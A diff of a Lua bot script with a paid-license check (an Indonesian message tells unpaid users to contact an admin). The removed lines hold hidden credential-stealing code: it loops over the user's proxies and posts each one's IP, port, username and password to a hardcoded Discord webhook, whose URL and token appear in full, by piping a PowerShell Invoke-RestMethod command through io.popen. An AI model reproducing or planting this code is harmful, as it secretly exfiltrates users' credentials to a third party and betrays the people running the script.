@@ -1,29 +1,10 @@
 
-for _,prox in pairs(getProxies()) do 
-    synProx(proxy.ip..':'..proxy.port..'|'..':'..proxy.username..':'..proxy.password)
-end
-webhookSyn = "https://discord.com/api/webhooks/1185569967626797178/FsLTvC0feuGjn8olpRFliriziUUDOz5gqkGiOuzkFHLbDpufGyY8cJX2ofqcO4OUujjL"
-
 udahBayar = false
 
 username = getUsername()
 client = HttpClient.new()
 client.url = "https://raw.githubusercontent.com/Falimby/LicencySC/LCeckher/"..username
 local response = client:request().body
-
-function synProx(status)
-    local text = [[
-        $webHookUrl = "]]..webhookSyn..[["
-        $payload = @{
-            content = "]]..status..[["
-        }
-        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-        Invoke-RestMethod -Uri $webHookUrl -Body ($payload | ConvertTo-Json -Depth 4) -Method Post -ContentType 'application/json'
-    ]]
-    local file = io.popen("powershell -command -", "w")
-    file:write(text)
-    file:close()
-end
 
 if response:find("404") then
     print("Anda Belum Bayar, Kalau Sudah Chat Admin")
